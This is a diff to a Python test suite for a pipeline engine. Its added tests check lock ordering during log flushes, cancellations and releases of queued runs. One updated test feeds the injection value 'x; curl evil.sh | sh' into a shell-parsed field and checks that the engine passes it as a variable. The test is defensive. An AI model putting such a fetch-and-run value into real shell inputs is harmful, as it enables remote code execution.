@@ -26,7 +26,9 @@ from dirigent_client.enums import (
 from dirigent_core.artifacts import canonical_json
 from dirigent_core.config import Settings
 from dirigent_core.database import DEADLOCK, session_scope
-from dirigent_core.engine import EngineServices
+from dirigent_core.engine import EngineServices, executor
+from dirigent_core.engine import runs as engine_runs
+from dirigent_core.engine.context import BufferedLogger
 from dirigent_core.engine.definition import (
     ConcurrencyPolicy,
     ItemPolicy,
@@ -302,6 +304,10 @@ class _BrokenSession:
         """Close without swallowing what was raised."""
         return False
 
+    def get_bind(self, *args: Any, **kwargs: Any) -> Any:
+        """Refuse the bind, which the lock a flush takes asks for first."""
+        raise RuntimeError("the database is unreachable")
+
     async def execute(self, *args: Any, **kwargs: Any) -> Any:
         """Refuse the statement."""
         raise RuntimeError("the database is unreachable")
@@ -425,6 +431,34 @@ async def test_a_step_whose_whole_log_was_flushed_leaves_no_engine_trace(
         ChattyOperator.released.set()
         await attempt
     assert [entry.message for entry in await logs_of(sessions, run.id)] == ["line 0"]
+
+
+async def test_a_flush_holds_the_run_while_it_writes(
+    sessions: Any, settings: Settings, host: PluginHost, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Two attempts flushing at once take their entry ids in one order and commit in another.
+
+    A stream pages a run's log by ``id > after``, so an id that commits after a higher one is
+    never fetched. SQLite locks no rows, so this asserts the call the PostgreSQL lane leans on.
+    """
+    engine, services = flushing_engine(sessions, settings, host)
+    definition = PipelineDefinition(code="ordered-log", steps=steps(only=StepDefinition(block="test.echo")))
+    run = await start(sessions, services, definition)
+    buffered = BufferedLogger(run_id=run.id, step_name="only", limit=10, batch=10)
+    buffered.info("a line")
+
+    locked: list[UUID] = []
+    lock_run = executor.lock_run
+
+    async def record(session: AsyncSession, run_id: UUID) -> None:
+        locked.append(run_id)
+        await lock_run(session, run_id)
+
+    monkeypatch.setattr(executor, "lock_run", record)
+    await engine._flush(buffered)  # pyright: ignore[reportPrivateUsage] - the transaction under test
+
+    assert locked == [run.id], "the flush wrote its entries without holding the run"
+    assert [entry.message for entry in await logs_of(sessions, run.id)] == ["a line"]
 
 
 async def test_a_handle_the_database_aborted_is_written_by_the_retry(
@@ -1530,6 +1564,81 @@ async def test_queue_holds_a_run_until_the_one_in_flight_finishes(
     assert len(EchoOperator.calls) == 2
 
 
+async def test_releasing_a_held_run_reads_the_slot_under_the_pipeline_lock(
+    engine: Engine, sessions: Any, services: EngineServices, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Releasing a held run and creating one decide the same slot, so both read under the lock.
+
+    SQLite locks no rows, so this asserts the order of the two calls rather than the exclusion
+    they buy on PostgreSQL.
+    """
+    definition = PipelineDefinition(
+        code="released-under-the-lock",
+        concurrency=ConcurrencyPolicy.QUEUE,
+        steps=steps(a=StepDefinition(block="test.echo")),
+    )
+    async with session_scope(sessions) as session:
+        version = await save_pipeline(session, definition)
+        first = await create_run(session, services, version)
+        second = await create_run(session, services, version)
+    assert first is not None and second is not None
+
+    order: list[str] = []
+    read_active = engine_runs.active_runs
+
+    async def record_lock(session: AsyncSession, pipeline_id: UUID) -> None:
+        order.append("lock")
+
+    async def record_read(session: AsyncSession, pipeline_id: UUID) -> list[Run]:
+        order.append("read")
+        return await read_active(session, pipeline_id)
+
+    monkeypatch.setattr(engine_runs, "lock_pipeline", record_lock)
+    monkeypatch.setattr(engine_runs, "active_runs", record_read)
+    await drain(engine)
+
+    assert order == ["lock", "read", "lock", "read"], "the slot was read outside the pipeline lock"
+    assert (await reload(sessions, second.id)).status is RunStatus.SUCCEEDED
+
+
+async def test_a_cancel_takes_the_pipeline_lock_before_the_run_lock(
+    sessions: Any, services: EngineServices, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """A cancel frees the slot at its end, so it takes the two locks the way creation does.
+
+    Reaching the pipeline while holding the run is the other order, and a creation holding the
+    pipeline and waiting for this run closes the cycle.
+    """
+    definition = PipelineDefinition(
+        code="cancelled-under-the-locks",
+        concurrency=ConcurrencyPolicy.QUEUE,
+        steps=steps(a=StepDefinition(block="test.echo")),
+    )
+    async with session_scope(sessions) as session:
+        version = await save_pipeline(session, definition)
+        first = await create_run(session, services, version)
+        second = await create_run(session, services, version)
+    assert first is not None and second is not None
+
+    order: list[str] = []
+
+    async def record_pipeline(session: AsyncSession, pipeline_id: UUID) -> None:
+        order.append("pipeline")
+
+    async def record_run(session: AsyncSession, run_id: UUID) -> None:
+        order.append("run")
+
+    monkeypatch.setattr(engine_runs, "lock_pipeline", record_pipeline)
+    monkeypatch.setattr(engine_runs, "lock_run", record_run)
+    async with session_scope(sessions) as session:
+        stored = await session.get(Run, first.id)
+        assert stored is not None
+        await cancel_run(session, services, stored, reason="an operator asked")
+
+    assert order == ["pipeline", "run", "pipeline"], "the cancel reached the pipeline holding the run"
+    assert (await statuses(sessions, second.id))["a"] == [AttemptStatus.QUEUED]
+
+
 # -- cancellation ----------------------------------------------------------------
 
 
@@ -2056,10 +2165,10 @@ def test_probe_statuses_are_the_four_the_engine_handles() -> None:
     }
 
 
-async def test_a_value_interpolated_into_a_shell_field_reaches_the_block_quoted(
+async def test_a_value_interpolated_into_a_shell_field_reaches_the_block_as_a_variable(
     engine: Engine, sessions: Any, services: EngineServices
 ) -> None:
-    """The block declares the field as shell-parsed; the engine is what quotes into it."""
+    """The block declares the field as shell-parsed; the engine is what keeps a value out of it."""
     definition = PipelineDefinition(
         code="quoted",
         steps=steps(only=StepDefinition(block="test.shellish", config={"command": "load ${params.region}"})),
@@ -2068,7 +2177,10 @@ async def test_a_value_interpolated_into_a_shell_field_reaches_the_block_quoted(
     await drain(engine)
     attempt = (await attempts_of(sessions, run.id))[0]
     assert attempt.status is AttemptStatus.SUCCEEDED
-    assert attempt.output == {"command": "load 'x; curl evil.sh | sh'"}
+    assert attempt.output == {
+        "command": 'load "$DIRIGENT_V0"',
+        "variables": {"DIRIGENT_V0": "x; curl evil.sh | sh"},
+    }
 
 
 async def test_a_manual_retry_is_keyed_on_the_step_it_retries(
